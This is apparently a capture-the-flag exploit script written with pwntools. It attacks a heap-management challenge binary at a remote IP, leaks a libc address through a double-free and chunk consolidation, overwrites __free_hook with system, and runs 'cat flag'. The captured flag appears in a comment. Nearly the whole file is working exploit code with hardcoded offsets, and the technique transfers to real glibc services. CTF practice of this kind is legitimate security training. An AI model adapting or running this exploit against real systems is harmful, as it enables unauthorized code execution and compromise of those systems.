from pwn import *
import time

debug = 0
online=False
if( debug == 0):
  r = remote("34.92.96.238", 10001)
  libcz = ELF("./lib/libc.so.6")
  online=True
elif(debug == 1):
  libcz = ELF("/lib/x86_64-linux-gnu/libc.so.6")
  r =process( ['./lib/ld-2.29.so', '--library-path', './lib', './chall'])

def halt():
  while True:
    log.info( r.recvline() )

def add( length, name, nickname):
  r.recvuntil("choice:")
  r.sendline('1')
  r.recvuntil("girl's name")
  r.sendline( str(length) )
  r.recvuntil("her name:")
  r.sendline( name )
  r.recvuntil("call:")
  r.sendline( nickname )

def show( index ):
  r.recvuntil("choice:")
  r.sendline('2')
  r.recvuntil("index:")
  r.sendline( str(index) )

def edit(index):
  r.recvuntil("choice:")
  r.sendline('3')

def call_girl(index):
  r.recvuntil("choice:")
  r.sendline('4')
  r.recvuntil("index:")
  r.sendline(str(index))

def give_up():
  r.recvuntil("choice:")
  r.sendline('5')

def interactive():
  if not online:
    print( """/usr/bin/gdb -q  {0} {1}""".format( r.argv[0], r.pid ) )
  r.interactive()

def exploit():
 girls_till_now = 0
 add(0x18 -0x8, "A", "1") #0
 add(0x18 -0x8, "B", "2") #1
 call_girl(0)
 call_girl(1)
 add(0x90 -0x8, "consolidate", "1") #2
 #call_girl( girls_till_now )
 add(0x90 -0x8, "consolidate", "1") #3
 girls_till_now += 4

 for x in range(7):
  print("till now:{0}".format(x))
  add(0x90 - 0x8, "x", "1") #10
 for x in range(girls_till_now, girls_till_now + 7):
  call_girl(x)
 girls_till_now += 7
 add(0x18-0x8, "just lucky", "2") #11
 add(0x18-0x8, "just lucky", "2") #12
 call_girl( 11 )
 call_girl( 12 )

 # consolidate in unsorted
 call_girl( 2 ) #chunk A
 call_girl( 3 ) #chunk B
 add(0x90 - 0x8, "ok", "1")  #13
 call_girl(3)

 #leak
 show( 2 )
 r.recvuntil("name:"); r.recvline()
 leak_arena = u64(r.recvline().rstrip().ljust(8, "\x00"))
 log.info("leak heap 0x%x " % leak_arena)
 libc_base = (leak_arena - 0x3b1c40 - 0x60 )
 log.info("libc base 0x%x " % libc_base)
 free_hook = libc_base + 0x03b38c8
 one_gadget = libc_base + 0x41c30 #system instead

 add(0x120 - 0x8, "A"*0x90 + p64(free_hook), "1") #14
 add(0x90 -0x8, "cat flag\x00", "1") #15
 add(0x90 -0x8, p64(one_gadget)*0x2, "1") #16
 call_girl(15)
 interactive() #*CTF{pqyPl2seQzkX3r0YntKfOMF4i8agb56D}


exploit()